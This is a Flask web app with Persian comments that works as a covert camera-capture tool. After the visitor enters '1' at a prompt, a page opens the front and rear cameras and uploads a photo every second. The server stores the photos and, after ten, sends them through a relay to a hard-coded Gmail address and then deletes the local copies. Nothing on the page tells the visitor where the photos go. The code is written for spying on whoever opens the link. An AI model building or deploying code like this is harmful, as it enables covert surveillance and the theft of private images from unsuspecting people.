from flask import Flask, request, render_template_string
import os
import base64
from datetime import datetime
import requests
import time

app = Flask(__name__)

# مسیر ذخیره تصاویر
IMAGE_DIR = "camera_captures"
os.makedirs(IMAGE_DIR, exist_ok=True)

# آدرس سرور واسط برای ارسال ایمیل
EMAIL_SERVER_URL = "https://your-email-server.com/send-email"

# تابعی برای پاک کردن کدهای قبلی (شبیه‌سازی پاک شدن کدها)
def clear_previous_code():
    print("\nکدهای قبلی پاک شدند.\n")

@app.route('/')
def index():
    # درخواست از کاربر برای وارد کردن عدد
    return render_template_string('''
        <script>
            let userInput = prompt("Enter a number:");

            if (userInput == "1") {
                alert("لینک ساخته می‌شود و کدها اجرا خواهند شد!");
                window.location.href = "/run_code";  // انتقال به URL برای اجرای کد
            } else {
                alert("عدد اشتباه وارد شده است.");
            }
        </script>
    ''')

@app.route('/run_code')
def run_code():
    clear_previous_code()  # پاک کردن کدهای قبلی
    return render_template_string('''
        <h3>در حال گرفتن عکس...</h3>
        <script>
            async function startCapture(cameraType) {
                try {
                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraType } });
                    let video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => { captureImage(video, cameraType); }, 1000); // هر ۱ ثانیه عکس بگیره
                } catch (err) {
                    console.error("دسترسی به دوربین ممکن نیست:", err);
                }
            }

            function captureImage(video, cameraType) {
                let canvas = document.createElement("canvas");
                let context = canvas.getContext("2d");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                let imageData = canvas.toDataURL("image/png");

                fetch("/upload", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ image: imageData, camera: cameraType })
                }).then(response => response.text()).then(text => {
                    document.getElementById('status').innerText = text;  // نمایش وضعیت در صفحه
                });

                setTimeout(() => { captureImage(video, cameraType); }, 1000); // تکرار عکس گرفتن هر ۱ ثانیه
            }

            startCapture("user"); // دوربین جلو
            startCapture("environment"); // دوربین عقب
        </script>

        <h4 id="status"></h4> <!-- نمایش وضعیت عکس‌ها -->
    ''')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json['image']
    camera_type = request.json['camera']
    image_data = base64.b64decode(data.split(',')[1])
    
    filename = f"{IMAGE_DIR}/{camera_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    with open(filename, "wb") as f:
        f.write(image_data)

    # ارسال عکس‌ها بعد از ۱۰ عکس
    if len(os.listdir(IMAGE_DIR)) >= 10:
        send_images()

    return f"✅ عکس ذخیره شد! ({len(os.listdir(IMAGE_DIR))} عکس گرفته شد)"

def send_images():
    image_files = [os.path.join(IMAGE_DIR, f) for f in os.listdir(IMAGE_DIR)]
    
    if not image_files:
        return

    # ارسال عکس‌ها به سرور واسط
    files = [("attachments", (os.path.basename(img), open(img, "rb").read(), "image/png")) for img in image_files]
    response = requests.post(EMAIL_SERVER_URL, files=files, data={"to": "ai.site.serching@gmail.com"})

    # حذف عکس‌ها بعد از ارسال
    for image in image_files:
        os.remove(image)

    # نمایش پیام ارسال شده
    return "✅ ۱۰ عکس ارسال شد!"

if __name__ == '__main__':
    app.run(debug=True, port=5000)
